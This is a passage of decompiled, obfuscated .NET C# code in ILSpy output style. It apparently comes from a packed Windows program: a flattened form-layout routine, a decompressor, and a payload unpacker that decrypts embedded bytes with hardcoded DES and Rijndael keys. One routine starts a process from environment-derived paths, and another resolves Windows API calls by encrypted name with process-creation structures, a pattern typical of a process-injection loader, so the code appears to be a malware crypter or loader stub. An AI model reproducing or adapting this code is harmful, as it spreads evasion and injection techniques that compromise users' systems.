		class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
		class25_0.uint_0 >>= 16;
		num = 5;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0086;
		}
		goto IL_00ac;
	}

	static ICryptoTransform smethod_145(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static void smethod_146(Form0 form0_0)
	{
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0568: Expected O, but got Unknown
		int num = 14;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_022d;
		}
		goto IL_088c;
		IL_088c:
		while (true)
		{
			switch (num)
			{
			case 29:
				((Control)form0_0.button_6).set_Location(new Point(((Control)form0_0.button_1).get_Left() - ((Control)form0_0.button_6).get_Width() - 6, 205));
				((Control)form0_0.button_6).set_TabIndex(14);
				((Control)form0_0.button_6).set_Text(Class14.smethod_0(3950));
				((Control)form0_0.button_6).set_Visible(false);
				((Control)form0_0.button_6).add_Click((EventHandler)form0_0.method_12);
				((Control)form0_0.label_1).set_Anchor((AnchorStyles)14);
				form0_0.label_1.set_FlatStyle((FlatStyle)3);
				((Control)form0_0.label_1).set_Location(new Point(20, 140));
				((Control)form0_0.label_1).set_Size(new Size(381, 55));
				((Control)form0_0.label_1).set_Text(string.Format(Class14.smethod_0(3959), Class14.smethod_0(3899)));
				((Control)form0_0.class38_0).set_Anchor((AnchorStyles)13);
				((Control)form0_0.class38_0).set_Location(new Point(20, 69));
				((Control)form0_0.class38_0).set_Size(new Size(381, 13));
				((Control)form0_0.button_2).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_2).set_FlatStyle((FlatStyle)3);
				goto IL_0459;
			case 20:
				break;
			case 12:
				goto IL_01a6;
			case 16:
				goto IL_022d;
			case 17:
				goto IL_0239;
			case 24:
				goto IL_025f;
			case 2:
				goto IL_029a;
			case 15:
				goto IL_03aa;
			case 5:
				goto IL_03dc;
			case 1:
				goto IL_0406;
			case 26:
				goto IL_043b;
			case 9:
				goto IL_0442;
			case 28:
				goto IL_0459;
			case 7:
			case 27:
				((ButtonBase)form0_0.button_6).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_6).set_Size(new Size(64, 24));
				goto case 29;
			case 22:
				((ButtonBase)form0_0.checkBox_0).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.checkBox_0).set_Location(new Point(22, 98));
				((Control)form0_0.checkBox_0).set_Size(new Size(226, 16));
				((Control)form0_0.checkBox_0).set_TabIndex(13);
				((Control)form0_0.checkBox_0).set_Text(Class14.smethod_0(3760));
				form0_0.checkBox_0.add_CheckedChanged((EventHandler)form0_0.method_5);
				goto case 3;
			case 3:
			case 18:
				((Control)form0_0.label_0).set_Anchor((AnchorStyles)14);
				form0_0.label_0.set_FlatStyle((FlatStyle)3);
				((Control)form0_0.label_0).set_Font(new Font(Class14.smethod_0(3821), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
				((Control)form0_0.label_0).set_Location(new Point(20, 124));
				goto case 6;
			case 6:
				((Control)form0_0.label_0).set_Size(new Size(381, 16));
				goto case 4;
			case 4:
				((Control)form0_0.label_0).set_Text(string.Format(Class14.smethod_0(3850), Class14.smethod_0(3899)));
				((Control)form0_0.button_0).set_Anchor((AnchorStyles)10);
				num = 19;
				if (aoKmv57A4wSEkvDOgia())
				{
					continue;
				}
				goto IL_0406;
			case 21:
				((Control)form0_0.panel_1).SuspendLayout();
				((Control)form0_0).SuspendLayout();
				form0_0.control1_0.IconState = Enum2.const_1;
				form0_0.control1_1.IconState = Enum2.const_1;
				((Control)form0_0.checkBox_0).set_Anchor((AnchorStyles)6);
				goto case 22;
			case 19:
				((ButtonBase)form0_0.button_0).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_0).set_Size(new Size(75, 24));
				((Control)form0_0.button_0).set_Location(new Point(400 - ((Control)form0_0.button_0).get_Width(), 205));
				((Control)form0_0.button_0).set_TabIndex(4);
				((Control)form0_0.button_0).set_Text(Class14.smethod_0(3908));
				((Control)form0_0.button_0).add_Click((EventHandler)form0_0.method_2);
				((Control)form0_0.button_1).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_1).set_FlatStyle((FlatStyle)3);
				((Control)form0_0.button_1).set_Size(new Size(105, 24));
				((Control)form0_0.button_1).set_Location(new Point(((Control)form0_0.button_0).get_Left() - ((Control)form0_0.button_1).get_Width() - 6, 205));
				((Control)form0_0.button_1).set_TabIndex(3);
				((Control)form0_0.button_1).set_Text(Class14.smethod_0(3925));
				((Control)form0_0.button_1).add_Click((EventHandler)form0_0.method_1);
				((Control)form0_0.button_6).set_Anchor((AnchorStyles)10);
				goto case 7;
			case 14:
				((Control)form0_0.panel_0).SuspendLayout();
				num = 21;
				if (XdRJXa7sy9ebEBASZRt())
				{
				}
				continue;
			case 13:
				((Control)form0_0.button_4).set_Size(((Control)form0_0.button_3).get_Size());
				((Control)form0_0.button_4).set_TabIndex(5);
				((Control)form0_0.button_4).set_Text(Class14.smethod_0(4187));
				((Control)form0_0.button_4).set_Visible(false);
				((Control)form0_0.button_4).add_Click((EventHandler)form0_0.method_10);
				goto default;
			default:
				((Control)form0_0.button_5).set_Anchor((AnchorStyles)10);
				((ButtonBase)form0_0.button_5).set_FlatStyle((FlatStyle)3);
				goto case 0;
			case 0:
				((Control)form0_0.button_5).set_Location(((Control)form0_0.button_3).get_Location());
				((Control)form0_0.button_5).set_Size(((Control)form0_0.button_3).get_Size());
				((Control)form0_0.button_5).set_TabIndex(5);
				((Control)form0_0.button_5).set_Text(Class14.smethod_0(4196));
				((Control)form0_0.button_5).set_Visible(false);
				((Control)form0_0.button_5).add_Click((EventHandler)form0_0.method_0);
				((Control)form0_0.control3_0).set_Location(new Point(87, 146));
				((Control)form0_0.control3_0).set_Visible(false);
				((Control)form0_0.control0_0).SetBounds(24, 72, 368, 16);
				((Control)form0_0.control0_1).SetBounds(24, 96, 368, 16);
				goto IL_025f;
			case 11:
				((Form)form0_0).set_MaximizeBox(false);
				((Form)form0_0).set_StartPosition((FormStartPosition)1);
				((Control)form0_0).set_Text(Class14.smethod_0(4213));
				if (((Control)form0_0).get_Text().Length == 0)
				{
					goto case 10;
				}
				goto IL_094d;
			case 10:
				((Control)form0_0).set_Text(Class14.smethod_0(4218));
				goto IL_094d;
			case 25:
				((Form)form0_0).set_Size(new Size(419, 264));
				((Control)form0_0.panel_1).set_Dock((DockStyle)5);
				goto case 23;
			case 23:
				((Control)form0_0.panel_0).set_Dock((DockStyle)5);
				return;
			case 30:
				return;
				IL_094d:
				try
				{
					((Form)form0_0).set_TopMost(true);
				}
				catch
				{
				}
				((Control)form0_0.panel_0).ResumeLayout(false);
				((Control)form0_0.panel_1).ResumeLayout(false);
				((Control)form0_0).ResumeLayout(false);
				((Control)form0_0.button_4).BringToFront();
				((Control)form0_0.button_5).BringToFront();
				goto case 25;
			}
			break;
		}
		goto IL_0149;
		IL_025f:
		((Control)form0_0.control0_2).SetBounds(24, 120, 368, 16);
		((Control)form0_0.control0_3).SetBounds(24, 144, 368, 16);
		((Control)form0_0.control2_0).set_Anchor((AnchorStyles)6);
		goto IL_029a;
		IL_03dc:
		((Form)form0_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form0_0).set_ClientSize(new Size(434, 488));
		((Form)form0_0).set_ControlBox(false);
		goto IL_0406;
		IL_029a:
		((Control)form0_0.control2_0).SetBounds(20, 444, 120, 32);
		((Control)form0_0.panel_0).get_Controls().AddRange((Control[])(object)new Control[8]
		{
			(Control)form0_0.button_6,
			(Control)form0_0.checkBox_0,
			(Control)form0_0.label_0,
			(Control)form0_0.button_0,
			(Control)form0_0.button_1,
			(Control)form0_0.label_1,
			(Control)form0_0.class38_0,
			form0_0.control1_0
		});
		((Control)form0_0.panel_0).set_Size(new Size(413, 240));
		((Control)form0_0.panel_0).set_TabIndex(0);
		((Control)form0_0.panel_1).get_Controls().AddRange((Control[])(object)new Control[10]
		{
			(Control)form0_0.button_2,
			(Control)form0_0.button_3,
			(Control)form0_0.button_4,
			(Control)form0_0.button_5,
			form0_0.control3_0,
			form0_0.control1_1,
			form0_0.control0_0,
			form0_0.control0_1,
			form0_0.control0_2,
			form0_0.control0_3
		});
		goto IL_03aa;
		IL_03aa:
		((Control)form0_0.panel_1).set_Size(new Size(413, 240));
		((Control)form0_0.panel_1).set_TabIndex(2);
		((Control)form0_0.panel_1).set_Visible(false);
		goto IL_03dc;
		IL_043b:
		((Form)form0_0).set_ShowInTaskbar(false);
		goto IL_0442;
		IL_0239:
		((Control)form0_0.button_4).set_Location(((Control)form0_0.button_3).get_Location());
		num = 13;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_025f;
		}
		goto IL_088c;
		IL_022d:
		((ButtonBase)form0_0.button_4).set_FlatStyle((FlatStyle)3);
		goto IL_0239;
		IL_01a6:
		((Control)form0_0.button_3).set_Size(new Size(105, 24));
		((Control)form0_0.button_3).set_Location(new Point(((Control)form0_0.button_2).get_Left() - ((Control)form0_0.button_3).get_Width() - 6, 205));
		((Control)form0_0.button_3).set_TabIndex(6);
		((Control)form0_0.button_3).set_Text(Class14.smethod_0(4182));
		((Control)form0_0.button_3).add_Click((EventHandler)form0_0.method_4);
		((Control)form0_0.button_4).set_Anchor((AnchorStyles)10);
		goto IL_022d;
		IL_0149:
		((Control)form0_0.button_2).set_TabIndex(7);
		((Control)form0_0.button_2).set_Text(Class14.smethod_0(4169));
		((Control)form0_0.button_2).add_Click((EventHandler)form0_0.method_3);
		((Control)form0_0.button_3).set_Anchor((AnchorStyles)10);
		((Control)form0_0.button_3).set_Enabled(false);
		((ButtonBase)form0_0.button_3).set_FlatStyle((FlatStyle)3);
		goto IL_01a6;
		IL_0459:
		((Control)form0_0.button_2).set_Size(new Size(80, 24));
		((Control)form0_0.button_2).set_Location(new Point(400 - ((Control)form0_0.button_2).get_Width(), 205));
		goto IL_0149;
		IL_0442:
		((Form)form0_0).set_MinimizeBox(false);
		num = 11;
		if (XdRJXa7sy9ebEBASZRt())
		{
			goto IL_0459;
		}
		goto IL_088c;
		IL_0406:
		((Control)form0_0).get_Controls().AddRange((Control[])(object)new Control[3]
		{
			form0_0.control2_0,
			(Control)form0_0.panel_0,
			(Control)form0_0.panel_1
		});
		((Form)form0_0).set_FormBorderStyle((FormBorderStyle)1);
		goto IL_043b;
	}

	static int smethod_147(Class15.Class21 class21_0, byte[] byte_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int num3 = num2;
		while (true)
		{
			int num4 = Class33.smethod_42(class21_0.class25_0, byte_0, num, num2);
			num += num4;
			class21_0.long_0 += num4;
			num2 -= num4;
			if (num2 == 0 || class21_0.int_0 == 30)
			{
				break;
			}
			Class15.Class24 class24_ = class21_0.class24_0;
			bool bool_ = (class21_0.int_0 & 4) != 0;
			if (Class33.smethod_7((class21_0.int_0 & 8) != 0, class24_, bool_))
			{
				continue;
			}
			if (class21_0.int_0 != 16)
			{
				if (class21_0.int_0 == 20)
				{
					for (int num5 = 8 + (-class21_0.class25_0.BitCount & 7); num5 > 0; num5 -= 10)
					{
						Class33.smethod_144(class21_0.class25_0, 2, 10);
					}
					class21_0.int_0 = 16;
				}
				else if (class21_0.int_0 == 28)
				{
					Class33.smethod_22(class21_0.class25_0);
					class21_0.int_0 = 30;
				}
				continue;
			}
			return num3 - num2;
		}
		return num3 - num2;
	}

	static Assembly[] smethod_148(Class29 class29_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class33.smethod_92() };
		}
	}

	static Icon smethod_149(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class14.smethod_0(3356) + string_0 + Class14.smethod_0(4239));
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static int smethod_150(int int_0, Class15.Class22 class22_0)
	{
		if (int_0 != 255)
		{
			int num = 257;
			int result = default(int);
			while (true)
			{
				if (int_0 >= 8)
				{
					num += 4;
					int_0 >>= 1;
					continue;
				}
				int num2 = 5;
				if (!XdRJXa7sy9ebEBASZRt())
				{
				}
				while (true)
				{
					switch (num2)
					{
					default:
						num2 = 4;
						if (!XdRJXa7sy9ebEBASZRt())
						{
						}
						continue;
					case 4:
						break;
					case 0:
					case 2:
						goto end_IL_0056;
					case 5:
						return num + int_0;
					case 1:
					case 3:
						return result;
					}
					break;
				}
				continue;
				end_IL_0056:
				break;
			}
		}
		return 285;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_151(Class15.Class24 class24_0)
	{
		Array.Copy(class24_0.byte_0, 32768, class24_0.byte_0, 0, 32768);
		int num2 = default(int);
		while (true)
		{
			class24_0.int_1 -= 32768;
			class24_0.int_4 -= 32768;
			while (true)
			{
				class24_0.int_3 -= 32768;
				int num = 0;
				while (true)
				{
					if (num < 32768)
					{
						num2 = class24_0.short_0[num] & 0xFFFF;
						goto IL_0030;
					}
					int i = 0;
					if (aoKmv57A4wSEkvDOgia())
					{
						switch (5)
						{
						case 0:
						case 1:
							goto end_IL_0082;
						case 2:
							goto end_IL_008c;
						case 3:
						case 5:
						case 6:
							goto IL_00f9;
						}
						goto IL_0030;
					}
					goto IL_00f9;
					IL_00f9:
					for (; i < 32768; i++)
					{
						int num3 = class24_0.short_1[i] & 0xFFFF;
						class24_0.short_1[i] = (short)((num3 >= 32768) ? (num3 - 32768) : 0);
					}
					return;
					IL_0030:
					class24_0.short_0[num] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
					num++;
					continue;
					end_IL_0082:
					break;
				}
				continue;
				end_IL_008c:
				break;
			}
		}
	}

	static void smethod_152(Class15.Class25 class25_0, int int_0)
	{
		class25_0.byte_0[class25_0.int_1++] = (byte)int_0;
		class25_0.byte_0[class25_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_153(Class15.Class22.Class23 class23_0)
	{
		int num = class23_0.short_0.Length;
		int num2 = 9;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0064;
		}
		goto IL_02a5;
		IL_02a5:
		int num5 = default(int);
		int[] array = default(int[]);
		int num3 = default(int);
		int num4 = default(int);
		switch (num2)
		{
		case 18:
			num5 = 0;
			goto IL_001d;
		case 16:
			break;
		case 17:
			goto IL_0064;
		case 2:
			goto IL_00ff;
		case 12:
			goto IL_0105;
		case 11:
			goto IL_018d;
		case 4:
		case 13:
			goto IL_01c5;
		case 7:
			goto IL_01cf;
		case 8:
			goto IL_01da;
		case 1:
			goto IL_0207;
		case 0:
		case 5:
			goto IL_0221;
		case 3:
			goto IL_0225;
		case 15:
			goto IL_0230;
		case 10:
			goto IL_025f;
		default:
			goto IL_026a;
		case 6:
			goto IL_0283;
		case 9:
			array = new int[num];
			num3 = 0;
			num4 = 0;
			goto case 18;
		case 19:
			goto IL_02ff;
		}
		goto IL_0058;
		IL_0207:
		int[] array2 = new int[4 * num3 - 2];
		int[] array3 = new int[2 * num3 - 1];
		goto IL_0221;
		IL_01cf:
		int num6 = default(int);
		int num7 = default(int);
		if ((num7 = num6) > 0)
		{
			goto IL_01da;
		}
		goto IL_0283;
		IL_001d:
		int num8 = default(int);
		int num9 = default(int);
		if (num5 < num)
		{
			num8 = class23_0.short_0[num5];
			if (num8 != 0)
			{
				num9 = num3++;
				goto IL_0058;
			}
			goto IL_005e;
		}
		while (num3 < 2)
		{
			int num10 = ((num4 < 2) ? (++num4) : 0);
			array[num3++] = num10;
		}
		class23_0.int_1 = Math.Max(num4 + 1, class23_0.int_0);
		int num11 = num3;
		num2 = 1;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0283;
		}
		goto IL_02a5;
		IL_00ff:
		if (num7 >= num3)
		{
			goto IL_0105;
		}
		if (num7 + 1 < num3 && array3[array[num7]] > array3[array[num7 + 1]])
		{
			num7++;
		}
		goto IL_026a;
		IL_0193:
		if (num7 < num3)
		{
			if (num7 + 1 < num3 && array3[array[num7]] > array3[array[num7 + 1]])
			{
				num7++;
			}
			array[num6] = array[num7];
			num6 = num7;
			goto IL_01c5;
		}
		goto IL_01cf;
		IL_0058:
		int num12;
		while (num9 > 0 && class23_0.short_0[array[num12 = (num9 - 1) / 2]] > num8)
		{
			array[num9] = array[num12];
			num9 = num12;
		}
		goto IL_0064;
		IL_026a:
		array[num6] = array[num7];
		num6 = num7;
		num7 = num7 * 2 + 1;
		goto IL_00ff;
		IL_018d:
		num6 = 0;
		num7 = 1;
		goto IL_0193;
		IL_0064:
		array[num9] = num5;
		num4 = num5;
		goto IL_005e;
		IL_005e:
		num5++;
		goto IL_001d;
		IL_0105:
		int num13 = default(int);
		int num14 = array3[num13];
		while ((num7 = num6) > 0 && array3[array[num6 = (num7 - 1) / 2]] > num14)
		{
			array[num7] = array[num6];
		}
		array[num7] = num13;
		int num15 = array[0];
		int num16 = default(int);
		num13 = num16++;
		int num17 = default(int);
		array2[2 * num13] = num17;
		array2[2 * num13 + 1] = num15;
		int num18 = Math.Min(array3[num17] & 0xFF, array3[num15] & 0xFF);
		num14 = (array3[num13] = array3[num17] + array3[num15] - num18 + 1);
		goto IL_018d;
		IL_0230:
		int num19 = default(int);
		int num20 = default(int);
		array2[2 * num19] = num20;
		array2[2 * num19 + 1] = -1;
		array3[num19] = class23_0.short_0[num20] << 8;
		array[num19] = num19;
		num19++;
		goto IL_025f;
		IL_01c5:
		num7 = num6 * 2 + 1;
		goto IL_0193;
		IL_01da:
		if (array3[array[num6 = (num7 - 1) / 2]] <= num14)
		{
			goto IL_0283;
		}
		array[num7] = array[num6];
		num2 = 7;
		if (!aoKmv57A4wSEkvDOgia())
		{
			goto IL_0207;
		}
		goto IL_02a5;
		IL_02ff:
		Class33.smethod_16(array2, class23_0);
		return;
		IL_0283:
		array[num7] = num13;
		if (num3 > 1)
		{
			goto IL_00bc;
		}
		goto IL_02ff;
		IL_0221:
		num16 = num11;
		goto IL_0225;
		IL_0225:
		num19 = 0;
		goto IL_025f;
		IL_025f:
		if (num19 < num3)
		{
			num20 = array[num19];
			goto IL_0230;
		}
		goto IL_00bc;
		IL_00bc:
		num17 = array[0];
		num13 = array[--num3];
		num6 = 0;
		num7 = 1;
		goto IL_00ff;
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetReplExportDirSetInfo([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, ref long long_1);

	static byte[] smethod_154(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class33.smethod_62(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class15.Stream0 stream = new Class15.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class33.smethod_28(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class33.smethod_120(stream);
			int num3 = Class33.smethod_120(stream);
			int num4 = Class33.smethod_120(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class33.smethod_28(stream);
			Class33.smethod_28(stream);
			Class33.smethod_28(stream);
			int num5 = Class33.smethod_28(stream);
			int num6 = Class33.smethod_120(stream);
			int num7 = Class33.smethod_120(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class15.Class16 class16_ = new Class15.Class16(array2);
			array = new byte[num5];
			Class33.smethod_24(0, array.Length, array, class16_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class33.smethod_28(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class33.smethod_28(stream);
					num11 = Class33.smethod_28(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class15.Class16 class16_2 = new Class15.Class16(array3);
					Class33.smethod_24(i, num11, array, class16_2);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 209, 201, 191, 106, 67, 42, 29, 193 };
				byte[] byte_2 = new byte[8] { 82, 218, 164, 66, 40, 31, 81, 190 };
				using ICryptoTransform cryptoTransform = Class33.smethod_34(byte_2, bool_0: true, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class33.smethod_154(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class33.smethod_145(byte_5, byte_4, bool_0: true);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class33.smethod_154(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_155(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class23_0.int_1)
		{
			int num3 = 1;
			int num4 = class23_0.byte_0[num2];
			int num5;
			if (num4 == 0)
			{
				num5 = 2;
				if (XdRJXa7sy9ebEBASZRt())
				{
				}
				goto IL_0081;
			}
			int num6 = 6;
			int num7 = 3;
			if (num != num4)
			{
				Class33.smethod_108(class23_1, num4);
				num3 = 0;
			}
			goto IL_00bd;
			IL_0081:
			switch (num5)
			{
			case 2:
				break;
			case 8:
				Class33.smethod_144(class23_0.class22_0.class25_0, num3 - 3, 2);
				continue;
			default:
				goto IL_00f5;
			case 6:
				goto IL_00fd;
			case 7:
			case 9:
				goto IL_011b;
			case 0:
			case 3:
			case 4:
			case 5:
			case 10:
				continue;
			}
			num6 = 138;
			num7 = 3;
			goto IL_00bd;
			IL_00f5:
			Class33.smethod_108(class23_1, 17);
			goto IL_00fd;
			IL_011b:
			Class33.smethod_144(class23_0.class22_0.class25_0, num3 - 11, 7);
			continue;
			IL_00fd:
			Class33.smethod_144(class23_0.class22_0.class25_0, num3 - 3, 3);
			continue;
			IL_00bd:
			num = num4;
			num2++;
			while (num2 < class23_0.int_1 && num == class23_0.byte_0[num2])
			{
				num2++;
				if (++num3 >= num6)
				{
					break;
				}
			}
			if (num3 >= num7)
			{
				if (num != 0)
				{
					Class33.smethod_108(class23_1, 16);
					num5 = 8;
					if (XdRJXa7sy9ebEBASZRt())
					{
						continue;
					}
					goto IL_0081;
				}
				if (num3 <= 10)
				{
					goto IL_00f5;
				}
				Class33.smethod_108(class23_1, 18);
				goto IL_011b;
			}
			while (num3-- > 0)
			{
				Class33.smethod_108(class23_1, num);
			}
		}
	}

	static byte[] smethod_156(EventArgs1 eventArgs1_0)
	{
		return Class33.smethod_26(eventArgs1_0.class29_0);
	}

	[DllImport("kernel32.dll")]
	internal static extern short GetVersionEx(ref Class42.Struct15 struct15_0);

	static void smethod_157()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 493:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_0042;
						case 5:
							goto IL_0061;
						case 6:
							goto IL_00a2;
						case 7:
							goto IL_00ab;
						case 8:
							goto IL_00b9;
						case 9:
							goto IL_00eb;
						case 10:
							goto IL_0100;
						case 11:
							goto IL_011a;
						case 12:
							goto IL_0129;
						case 13:
							goto IL_0136;
						case 14:
							goto IL_0145;
						case 15:
							goto IL_016c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_016c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = Class14.smethod_0(4248);
					goto IL_0016;
					IL_0016:
					num = 3;
					text2 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_0042;
					IL_0042:
					num = 4;
					if (Operators.CompareString(text, Class33.smethod_140(Class14.smethod_0(3304)), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_0061;
					IL_0061:
					num = 5;
					text3 = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385)) + Class14.smethod_0(257);
					goto IL_00a2;
					IL_00a2:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_00ab;
					IL_00ab:
					num = 7;
					text4 = Class14.smethod_0(4269);
					goto IL_00b9;
					IL_00b9:
					num = 8;
					text5 = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class14.smethod_0(2080);
					goto IL_00eb;
					IL_00eb:
					num = 9;
					text6 = Class33.smethod_140(Class14.smethod_0(4286));
					goto IL_0100;
					IL_0100:
					num = 10;
					text7 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656)));
					goto IL_011a;
					IL_011a:
					num = 11;
					Conversion.Int(3405);
					goto IL_0129;
					IL_0129:
					num = 12;
					if (Class33.smethod_0(text6))
					{
						break;
					}
					goto IL_0136;
					IL_0136:
					num = 13;
					Conversion.Int(3405);
					goto IL_0145;
					IL_0145:
					num = 14;
					Process.Start(text7 + Class14.smethod_0(4319) + text6 + Class14.smethod_0(4324));
					goto IL_016c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 493;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_158(string string_0, string string_1, byte[] byte_0, bool bool_0)
	{
		string text = string.Format(Class14.smethod_0(4333), string_0);
		Class5.Class6.Struct1 startupInfo = default(Class5.Class6.Struct1);
		Class5.Class6.Struct3 processInformation = default(Class5.Class6.Struct3);
		string string_2 = Class33.smethod_140(Class14.smethod_0(4342));
		string string_3 = Class33.smethod_140(Class14.smethod_0(4403));
		string string_4 = Class33.smethod_140(Class14.smethod_0(4436));
		string string_5 = Class33.smethod_140(Class14.smethod_0(4469));
		string string_6 = Class33.smethod_140(Class14.smethod_0(4530));
		bool result;
		checked
		{
			startupInfo.uint_0 = (uint)Marshal.SizeOf(typeof(Class5.Class6.Struct1));
			string string_7 = Class33.smethod_140(Class14.smethod_0(4563));
			string string_8 = Class33.smethod_140(Class14.smethod_0(4624));
			string string_9 = Class33.smethod_140(Class14.smethod_0(4685));
			string string_10 = Class33.smethod_140(Class14.smethod_0(4746));
			string string_11 = Class33.smethod_140(Class14.smethod_0(4807));
			Class5.Class6.Delegate0 @delegate = Class5.Class6.smethod_0<Class5.Class6.Delegate0>(Class14.smethod_0(4868), string_11);
			Class5.Class6.Delegate3 delegate2 = Class5.Class6.smethod_0<Class5.Class6.Delegate3>(Class14.smethod_0(4868), string_10);
			Class5.Class6.Delegate2 delegate3 = Class5.Class6.smethod_0<Class5.Class6.Delegate2>(Class14.smethod_0(4877), string_9);
			Class5.Class6.Delegate5 delegate4 = Class5.Class6.smethod_0<Class5.Class6.Delegate5>(Class14.smethod_0(4868), string_8);
			Class5.Class6.Delegate6 delegate5 = Class5.Class6.smethod_0<Class5.Class6.Delegate6>(Class14.smethod_0(4877), string_7);
			Class5.Class6.Delegate4 delegate6 = Class5.Class6.smethod_0<Class5.Class6.Delegate4>(Class14.smethod_0(4877), string_6);
			Class5.Class6.Delegate7 delegate7 = Class5.Class6.smethod_0<Class5.Class6.Delegate7>(Class14.smethod_0(4868), string_3);
			Class5.Class6.Delegate1 delegate8 = Class5.Class6.smethod_0<Class5.Class6.Delegate1>(Class14.smethod_0(4877), string_4);
